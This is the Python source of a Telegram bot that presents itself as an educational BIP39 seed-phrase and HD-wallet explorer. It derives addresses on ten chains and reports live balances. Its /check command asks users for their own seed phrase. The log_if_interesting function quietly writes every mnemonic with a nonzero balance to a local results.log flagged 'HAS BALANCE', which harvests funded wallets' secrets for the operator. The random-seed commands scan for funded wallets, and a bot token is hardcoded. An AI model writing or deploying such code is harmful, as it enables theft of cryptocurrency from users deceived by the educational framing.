"""
Mnemonic Explorer Bot v2 — Full Edition
Educational tool for BIP39 seed phrases and HD wallet derivation.
Features: 10 chains, USD values, USDT/USDC balances, history, wordlist, explain, compare
"""

import asyncio
import hashlib
import hmac
import logging
import os
import struct
from datetime import datetime, timezone
from collections import defaultdict

import aiohttp
from dotenv import load_dotenv
from mnemonic import Mnemonic
from bip_utils import (
    Bip39MnemonicValidator,
    Bip39SeedGenerator,
    Bip44, Bip44Coins, Bip44Changes,
    Bip49, Bip49Coins,
    Bip84, Bip84Coins,
)
import nacl.signing
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.constants import ParseMode

load_dotenv()

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN          = "8771834651:AAEbNZnTYk45JiU-KtI5SH0sARAUOtEylFw"
ETHERSCAN_API_KEY  = os.getenv("ETHERSCAN_API_KEY", "")
BSCSCAN_API_KEY    = os.getenv("BSCSCAN_API_KEY", "")
BLOCKCHAIR_API_KEY = os.getenv("BLOCKCHAIR_API_KEY", "")
REQUEST_TIMEOUT    = 15
RESULTS_LOG        = "results.log"
MAX_HISTORY        = 5

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
log = logging.getLogger(__name__)

user_history: dict = defaultdict(list)

# ── BIP39 Wordlist ────────────────────────────────────────────────────────────
_mnemo = Mnemonic("english")
BIP39_WORDS = set(_mnemo.wordlist)

# ── SLIP-0010 / Base58 ────────────────────────────────────────────────────────
_BASE58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def _base58_encode(data: bytes) -> str:
    n = int.from_bytes(data, "big")
    result = []
    while n:
        n, r = divmod(n, 58)
        result.append(_BASE58[r])
    for b in data:
        if b == 0:
            result.append(_BASE58[0])
        else:
            break
    return "".join(reversed(result))

def _slip10_derive(seed: bytes, path: list) -> bytes:
    I = hmac.new(b"ed25519 seed", seed, hashlib.sha512).digest()
    kL, kR = I[:32], I[32:]
    for idx in path:
        data = b"\x00" + kL + struct.pack(">I", idx)
        I = hmac.new(kR, data, hashlib.sha512).digest()
        kL, kR = I[:32], I[32:]
    return kL

# ── Wallet Derivation ─────────────────────────────────────────────────────────

def generate_mnemonic(word_count: int = 12) -> str:
    return _mnemo.generate(strength={12: 128, 24: 256}[word_count])

def is_valid_mnemonic(phrase: str) -> bool:
    return Bip39MnemonicValidator().IsValid(phrase)

def derive_all(mnemonic: str) -> dict:
    seed = Bip39SeedGenerator(mnemonic).Generate()

    eth = (Bip44.FromSeed(seed, Bip44Coins.ETHEREUM)
           .Purpose().Coin().Account(0)
           .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
           .PublicKey().ToAddress())

    btc_legacy = (Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
                  .Purpose().Coin().Account(0)
                  .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                  .PublicKey().ToAddress())

    btc_segwit = (Bip49.FromSeed(seed, Bip49Coins.BITCOIN)
                  .Purpose().Coin().Account(0)
                  .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                  .PublicKey().ToAddress())

    btc_native = (Bip84.FromSeed(seed, Bip84Coins.BITCOIN)
                  .Purpose().Coin().Account(0)
                  .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                  .PublicKey().ToAddress())

    trx = (Bip44.FromSeed(seed, Bip44Coins.TRON)
           .Purpose().Coin().Account(0)
           .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
           .PublicKey().ToAddress())

    ltc = (Bip44.FromSeed(seed, Bip44Coins.LITECOIN)
           .Purpose().Coin().Account(0)
           .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
           .PublicKey().ToAddress())

    priv = _slip10_derive(seed, [0x8000002C, 0x800001F5, 0x80000000, 0x80000000])
    sol  = _base58_encode(bytes(nacl.signing.SigningKey(priv).verify_key))

    return {
        "ethereum":       eth,
        "bitcoin_legacy": btc_legacy,
        "bitcoin_segwit": btc_segwit,
        "bitcoin_native": btc_native,
        "bnb":            eth,
        "polygon":        eth,
        "avalanche":      eth,
        "solana":         sol,
        "tron":           trx,
        "litecoin":       ltc,
    }

# ── Token contracts ───────────────────────────────────────────────────────────
ERC20  = {"USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
          "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"}
BEP20  = {"USDT": "0x55d398326f99059fF775485246999027B3197955",
          "USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"}
SOL_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"
SOL_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
TRC20  = {"USDT": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
          "USDC": "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8"}

# ── HTTP helpers ──────────────────────────────────────────────────────────────

async def _get(session, url, params=None):
    try:
        async with session.get(url, params=params,
                               timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception as e:
        log.warning("GET %s: %s", url, e)
    return None

async def _post(session, url, body):
    try:
        async with session.post(url, json=body,
                                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception as e:
        log.warning("POST %s: %s", url, e)
    return None

# ── Balance fetchers ──────────────────────────────────────────────────────────

async def _evm_native(session, addr, api, key=""):
    p = {"module": "account", "action": "balance", "address": addr, "tag": "latest"}
    if key: p["apikey"] = key
    d = await _get(session, api, p)
    return float(d["result"]) / 1e18 if d and d.get("status") == "1" else 0.0

async def _evm_token(session, addr, contract, api, key=""):
    p = {"module": "account", "action": "tokenbalance",
         "contractaddress": contract, "address": addr, "tag": "latest"}
    if key: p["apikey"] = key
    d = await _get(session, api, p)
    return float(d["result"]) / 1e6 if d and d.get("status") == "1" else 0.0

async def _btc_multi(session, addrs):
    url = f"https://api.blockchair.com/bitcoin/dashboards/addresses/{','.join(addrs)}"
    p = {"key": BLOCKCHAIR_API_KEY} if BLOCKCHAIR_API_KEY else {}
    d = await _get(session, url, p)
    result = {a: 0.0 for a in addrs}
    if d and "data" in d:
        for a in addrs:
            info = d["data"].get("addresses", {}).get(a)
            if info: result[a] = info.get("balance", 0) / 1e8
    return result

async def _ltc_native(session, addr):
    url = f"https://api.blockchair.com/litecoin/dashboards/address/{addr}"
    p = {"key": BLOCKCHAIR_API_KEY} if BLOCKCHAIR_API_KEY else {}
    d = await _get(session, url, p)
    if d and "data" in d:
        info = d["data"].get(addr, {}).get("address")
        if info: return info.get("balance", 0) / 1e8
    return 0.0

async def _sol_native(session, addr):
    d = await _post(session, "https://api.mainnet-beta.solana.com",
                    {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [addr]})
    return d.get("result", {}).get("value", 0) / 1e9 if d else 0.0

async def _sol_token(session, addr, mint):
    d = await _post(session, "https://api.mainnet-beta.solana.com", {
        "jsonrpc": "2.0", "id": 1, "method": "getTokenAccountsByOwner",
        "params": [addr, {"mint": mint}, {"encoding": "jsonParsed"}]
    })
    if d and "result" in d:
        for acc in d["result"].get("value", []):
            try:
                amt = acc["account"]["data"]["parsed"]["info"]["tokenAmount"]["uiAmount"]
                if amt: return float(amt)
            except Exception: pass
    return 0.0

async def _trx_native(session, addr):
    d = await _get(session, f"https://apilist.tronscanapi.com/api/accountv2?address={addr}")
    return d.get("balance", 0) / 1e6 if d else 0.0

async def _trc20_token(session, addr, contract):
    d = await _get(session, "https://apilist.tronscanapi.com/api/account/tokens",
                   {"address": addr, "start": 0, "limit": 20})
    if d and "data" in d:
        for t in d["data"]:
            if t.get("tokenId") == contract:
                return float(t.get("quantity", 0)) / 1e6
    return 0.0

async def _prices(session):
    ids = "bitcoin,ethereum,binancecoin,solana,tron,litecoin,matic-network,avalanche-2"
    d = await _get(session,
        f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd")
    if d:
        return {
            "BTC":   d.get("bitcoin",       {}).get("usd", 0),
            "ETH":   d.get("ethereum",      {}).get("usd", 0),
            "BNB":   d.get("binancecoin",   {}).get("usd", 0),
            "SOL":   d.get("solana",        {}).get("usd", 0),
            "TRX":   d.get("tron",          {}).get("usd", 0),
            "LTC":   d.get("litecoin",      {}).get("usd", 0),
            "MATIC": d.get("matic-network", {}).get("usd", 0),
            "AVAX":  d.get("avalanche-2",   {}).get("usd", 0),
        }
    return {}

async def fetch_all(addresses: dict) -> dict:
    async with aiohttp.ClientSession(
        headers={"User-Agent": "MnemonicExplorerBot/2.0 (educational)"}
    ) as session:
        btc_list = [addresses["bitcoin_legacy"], addresses["bitcoin_segwit"], addresses["bitcoin_native"]]
        results = await asyncio.gather(
            _evm_native(session, addresses["ethereum"],  "https://api.etherscan.io/api",  ETHERSCAN_API_KEY),
            _evm_native(session, addresses["bnb"],       "https://api.bscscan.com/api",   BSCSCAN_API_KEY),
            _evm_native(session, addresses["polygon"],   "https://api.polygonscan.com/api"),
            _evm_native(session, addresses["avalanche"], "https://api.snowtrace.io/api"),
            _btc_multi(session, btc_list),
            _ltc_native(session, addresses["litecoin"]),
            _sol_native(session, addresses["solana"]),
            _trx_native(session, addresses["tron"]),
            _evm_token(session, addresses["ethereum"], ERC20["USDT"],  "https://api.etherscan.io/api", ETHERSCAN_API_KEY),
            _evm_token(session, addresses["ethereum"], ERC20["USDC"],  "https://api.etherscan.io/api", ETHERSCAN_API_KEY),
            _evm_token(session, addresses["bnb"],      BEP20["USDT"],  "https://api.bscscan.com/api",  BSCSCAN_API_KEY),
            _evm_token(session, addresses["bnb"],      BEP20["USDC"],  "https://api.bscscan.com/api",  BSCSCAN_API_KEY),
            _sol_token(session, addresses["solana"],   SOL_USDT_MINT),
            _sol_token(session, addresses["solana"],   SOL_USDC_MINT),
            _trc20_token(session, addresses["tron"],   TRC20["USDT"]),
            _trc20_token(session, addresses["tron"],   TRC20["USDC"]),
            _prices(session),
        )

    (eth_b, bnb_b, matic_b, avax_b, btc_b, ltc_b, sol_b, trx_b,
     eth_usdt, eth_usdc, bnb_usdt, bnb_usdc, sol_usdt, sol_usdc,
     trx_usdt, trx_usdc, px) = results

    native = {
        "ethereum":       eth_b,
        "bitcoin_legacy": btc_b.get(addresses["bitcoin_legacy"], 0.0),
        "bitcoin_segwit": btc_b.get(addresses["bitcoin_segwit"], 0.0),
        "bitcoin_native": btc_b.get(addresses["bitcoin_native"], 0.0),
        "bnb":            bnb_b,
        "polygon":        matic_b,
        "avalanche":      avax_b,
        "solana":         sol_b,
        "tron":           trx_b,
        "litecoin":       ltc_b,
    }
    sym_map = {
        "ethereum": "ETH", "bitcoin_legacy": "BTC", "bitcoin_segwit": "BTC",
        "bitcoin_native": "BTC", "bnb": "BNB", "polygon": "MATIC",
        "avalanche": "AVAX", "solana": "SOL", "tron": "TRX", "litecoin": "LTC",
    }
    usd = {k: native[k] * px.get(sym_map[k], 0) for k in native}
    tokens = {
        "eth_usdt": eth_usdt, "eth_usdc": eth_usdc,
        "bnb_usdt": bnb_usdt, "bnb_usdc": bnb_usdc,
        "sol_usdt": sol_usdt, "sol_usdc": sol_usdc,
        "trx_usdt": trx_usdt, "trx_usdc": trx_usdc,
    }
    return {"native": native, "tokens": tokens, "usd": usd, "prices": px}

# ── Explorer links ────────────────────────────────────────────────────────────
def explorer(chain, addr):
    m = {
        "ethereum":       f"https://etherscan.io/address/{addr}",
        "bitcoin_legacy": f"https://blockchair.com/bitcoin/address/{addr}",
        "bitcoin_segwit": f"https://blockchair.com/bitcoin/address/{addr}",
        "bitcoin_native": f"https://blockchair.com/bitcoin/address/{addr}",
        "bnb":            f"https://bscscan.com/address/{addr}",
        "polygon":        f"https://polygonscan.com/address/{addr}",
        "avalanche":      f"https://snowtrace.io/address/{addr}",
        "solana":         f"https://solscan.io/account/{addr}",
        "tron":           f"https://tronscan.org/#/address/{addr}",
        "litecoin":       f"https://blockchair.com/litecoin/address/{addr}",
    }
    return m.get(chain, "#")

# ── Logger ────────────────────────────────────────────────────────────────────
def log_if_interesting(mnemonic, addresses, balances):
    total = sum(balances["usd"].values()) + sum(balances["tokens"].values())
    if total <= 0: return
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    lines = ["=" * 60, f"TIMESTAMP : {ts}", f"MNEMONIC  : {mnemonic}",
             f"TOTAL USD : ${total:.2f}", "", "DETAILS:"]
    for k, addr in addresses.items():
        u = balances["usd"].get(k, 0)
        flag = "  *** HAS BALANCE ***" if u > 0 else ""
        lines.append(f"  {k:16}: {addr}  ${u:.2f}{flag}")
    lines += ["", ""]
    try:
        with open(RESULTS_LOG, "a") as f:
            f.write("\n".join(lines))
        log.info("💰 Logged $%.2f result", total)
    except OSError as e:
        log.error("Log error: %s", e)

# ── Chain metadata ────────────────────────────────────────────────────────────
CHAINS = [
    ("🔷", "Ethereum",       "ETH",   "m/44'/60'/0'/0/0",  "ethereum"),
    ("🔶", "Bitcoin Legacy",  "BTC",   "m/44'/0'/0'/0/0",   "bitcoin_legacy"),
    ("🟠", "Bitcoin SegWit",  "BTC",   "m/49'/0'/0'/0/0",   "bitcoin_segwit"),
    ("🟡", "Bitcoin Native",  "BTC",   "m/84'/0'/0'/0/0",   "bitcoin_native"),
    ("🟢", "BNB Chain",       "BNB",   "m/44'/60'/0'/0/0",  "bnb"),
    ("🔵", "Polygon",         "MATIC", "m/44'/60'/0'/0/0",  "polygon"),
    ("🔴", "Avalanche",       "AVAX",  "m/44'/60'/0'/0/0",  "avalanche"),
    ("🟣", "Solana",          "SOL",   "m/44'/501'/0'/0'",  "solana"),
    ("⚡",  "Tron",           "TRX",   "m/44'/195'/0'/0/0", "tron"),
    ("🩶", "Litecoin",        "LTC",   "m/44'/2'/0'/0/0",   "litecoin"),
]
TOKEN_ROWS = [
    ("eth_usdt","ETH","USDT"), ("eth_usdc","ETH","USDC"),
    ("bnb_usdt","BNB","USDT"), ("bnb_usdc","BNB","USDC"),
    ("sol_usdt","SOL","USDT"), ("sol_usdc","SOL","USDC"),
    ("trx_usdt","TRX","USDT"), ("trx_usdc","TRX","USDC"),
]

# ── Format reply ──────────────────────────────────────────────────────────────
def format_reply(mnemonic, addresses, balances, label):
    words    = mnemonic.split()
    numbered = " ".join(f"{i+1}.{w}" for i, w in enumerate(words))
    px       = balances.get("prices", {})
    total    = sum(balances["usd"].values()) + sum(balances["tokens"].values())

    lines = [
        f"🧠 <b>Mnemonic Explorer Bot v2</b> — {label}", "",
        f"📝 <b>Seed Phrase ({len(words)} words):</b>",
        f"<code>{numbered}</code>", "",
        f"💼 <b>Total Portfolio: ${total:.2f} USD</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "📊 <b>Native Balances</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━", "",
    ]

    for icon, name, sym, path, key in CHAINS:
        addr  = addresses.get(key, "N/A")
        nat   = balances["native"].get(key, 0.0)
        usd   = balances["usd"].get(key, 0.0)
        price = px.get(sym, 0)
        link  = explorer(key, addr)
        p_str = f"  <i>@${price:,.2f}</i>" if price else ""
        lines += [
            f"{icon} <b>{name}</b>  <a href='{link}'>🔗</a>",
            f"   <code>{addr}</code>",
            f"   {nat:.6f} {sym} = <b>${usd:.2f}</b>{p_str}", "",
        ]

    tok_total = sum(balances["tokens"].values())
    lines += [
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"🪙 <b>Stablecoins  (${tok_total:.2f} total)</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━", "",
    ]
    for tkey, chain, sym in TOKEN_ROWS:
        amt = balances["tokens"].get(tkey, 0.0)
        lines.append(f"   {chain} {sym}: <b>${amt:.2f}</b>")

    lines += ["",
              "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
              "⚠️ <i>Educational use only. Never share real seed phrases.</i>"]
    return "\n".join(lines)

# ── Core processor ────────────────────────────────────────────────────────────
async def _process(mnemonic, update, label, uid=None):
    msg = await update.message.reply_text("⏳ Deriving addresses and fetching live data…")
    try:
        addresses = derive_all(mnemonic)
        balances  = await fetch_all(addresses)
        log_if_interesting(mnemonic, addresses, balances)
        if uid is not None:
            h = user_history[uid]
            h.append({
                "mnemonic":  mnemonic,
                "label":     label,
                "ts":        datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
                "total":     sum(balances["usd"].values()) + sum(balances["tokens"].values()),
            })
            if len(h) > MAX_HISTORY: h.pop(0)
        await msg.edit_text(
            format_reply(mnemonic, addresses, balances, label),
            parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as e:
        log.exception("Error")
        await msg.edit_text(f"❌ Error: <code>{e}</code>", parse_mode=ParseMode.HTML)

# ── Handlers ──────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to <b>Mnemonic Explorer Bot v2</b>!\n\n"
        "10 chains • Live USD values • USDT/USDC • Explorer links\n\n"
        "Type /help to see all commands.",
        parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🧠 <b>Mnemonic Explorer Bot v2</b>\n\n"
        "<b>Generation:</b>\n"
        "/generate12 — Random 12-word seed + all balances + USD\n"
        "/generate24 — Random 24-word seed + all balances + USD\n\n"
        "<b>Analysis:</b>\n"
        "/check &lt;phrase&gt; — Check your own seed phrase\n"
        "/compare &lt;phrase&gt; — Show all derived addresses side by side\n\n"
        "<b>Learning:</b>\n"
        "/wordlist &lt;word&gt; — Is this word in the BIP39 list?\n"
        "/explain — How seed phrases and HD wallets work\n\n"
        "<b>Utility:</b>\n"
        "/history — Your last 5 checks\n\n"
        "<b>10 Chains:</b> ETH • BTC (×3) • BNB • MATIC • AVAX • SOL • TRX • LTC\n"
        "<b>Tokens:</b> USDT &amp; USDC on ETH, BNB, SOL, TRX\n\n"
        "⚠️ <i>Educational use only.</i>",
        parse_mode=ParseMode.HTML)

async def cmd_generate12(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _process(generate_mnemonic(12), update, "🎲 Random 12-word", update.effective_user.id)

async def cmd_generate24(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _process(generate_mnemonic(24), update, "🎲 Random 24-word", update.effective_user.id)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "📨 Usage: <code>/check word1 word2 ... word12</code>",
            parse_mode=ParseMode.HTML)
        return
    phrase = " ".join(context.args).strip().lower()
    wc = len(phrase.split())
    if wc not in (12, 24):
        await update.message.reply_text(
            f"❌ Got <b>{wc} words</b>. Need exactly 12 or 24.", parse_mode=ParseMode.HTML)
        return
    if not is_valid_mnemonic(phrase):
        await update.message.reply_text(
            "❌ Invalid mnemonic — check words or checksum.", parse_mode=ParseMode.HTML)
        return
    await _process(phrase, update, f"🔍 Checked {wc}-word", update.effective_user.id)

async def cmd_compare(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "📨 Usage: <code>/compare word1 word2 ... word12</code>",
            parse_mode=ParseMode.HTML)
        return
    phrase = " ".join(context.args).strip().lower()
    if not is_valid_mnemonic(phrase):
        await update.message.reply_text("❌ Invalid mnemonic.", parse_mode=ParseMode.HTML)
        return
    addresses = derive_all(phrase)
    lines = ["🔀 <b>Address Comparison</b> — same seed, every chain", ""]
    for icon, name, sym, path, key in CHAINS:
        addr = addresses.get(key, "N/A")
        link = explorer(key, addr)
        lines += [f"{icon} <b>{name}</b> <code>{path}</code>",
                  f"   <a href='{link}'>{addr}</a>", ""]
    lines.append("⚠️ <i>All derived from the same seed phrase.</i>")
    await update.message.reply_text(
        "\n".join(lines), parse_mode=ParseMode.HTML, disable_web_page_preview=True)

async def cmd_wordlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "📨 Usage: <code>/wordlist apple</code>", parse_mode=ParseMode.HTML)
        return
    word = context.args[0].strip().lower()
    if word in BIP39_WORDS:
        await update.message.reply_text(
            f"✅ <b>{word}</b> is a valid BIP39 word.\n\n"
            "The BIP39 English list has 2,048 words. Each encodes 11 bits of entropy.",
            parse_mode=ParseMode.HTML)
    else:
        close = [w for w in BIP39_WORDS if w.startswith(word[:3])][:5]
        sug = f"\n\nDid you mean: {', '.join(close)}?" if close else ""
        await update.message.reply_text(
            f"❌ <b>{word}</b> is NOT in the BIP39 wordlist.{sug}",
            parse_mode=ParseMode.HTML)

async def cmd_explain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📚 <b>How Seed Phrases &amp; HD Wallets Work</b>\n\n"
        "<b>1. BIP39 — Mnemonic Phrases</b>\n"
        "Your seed phrase is a human-readable backup of your master key.\n"
        "• 12 words = 128 bits (~340 undecillion combinations)\n"
        "• 24 words = 256 bits (astronomically more)\n"
        "The last word includes a checksum to catch typos.\n\n"
        "<b>2. Seed Generation</b>\n"
        "Your phrase → PBKDF2-HMAC-SHA512 (2,048 rounds) → 512-bit master seed.\n"
        "Same phrase always → same seed. Fully deterministic.\n\n"
        "<b>3. BIP32 — HD Wallets</b>\n"
        "From the master seed, unlimited child keys are derived in a tree.\n"
        "Path format: <code>m / purpose' / coin' / account' / change / index</code>\n\n"
        "<b>4. BIP44/49/84 — Standards</b>\n"
        "• 44 = Legacy addresses\n"
        "• 49 = SegWit (P2SH)\n"
        "• 84 = Native SegWit (bech32)\n\n"
        "<b>5. Why one seed = all wallets</b>\n"
        "Trust Wallet, MetaMask, Ledger all use BIP39/44.\n"
        "Your 12 words unlock the same addresses on every app.\n\n"
        "<b>6. SLIP-0010 — Solana</b>\n"
        "Solana uses ed25519 keys. SLIP-0010 adapts BIP32 for ed25519.",
        parse_mode=ParseMode.HTML)

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    hist = user_history.get(uid, [])
    if not hist:
        await update.message.reply_text(
            "📭 No history yet. Try /generate12 or /check first.")
        return
    lines = ["📋 <b>Your Last Checks</b>", ""]
    for i, h in enumerate(reversed(hist), 1):
        words   = h["mnemonic"].split()
        preview = " ".join(words[:3]) + "…"
        lines += [
            f"<b>{i}. {h['label']}</b>",
            f"   🕐 {h['ts']}",
            f"   📝 <code>{preview}</code> ({len(words)} words)",
            f"   💰 <b>${h['total']:.2f}</b>", "",
        ]
    lines.append("<i>History clears when the bot restarts.</i>")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    for cmd, handler in [
        ("start",      cmd_start),
        ("help",       cmd_help),
        ("generate12", cmd_generate12),
        ("generate24", cmd_generate24),
        ("check",      cmd_check),
        ("compare",    cmd_compare),
        ("wordlist",   cmd_wordlist),
        ("explain",    cmd_explain),
        ("history",    cmd_history),
    ]:
        app.add_handler(CommandHandler(cmd, handler))
    log.info("🚀 Mnemonic Explorer Bot v2 running…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
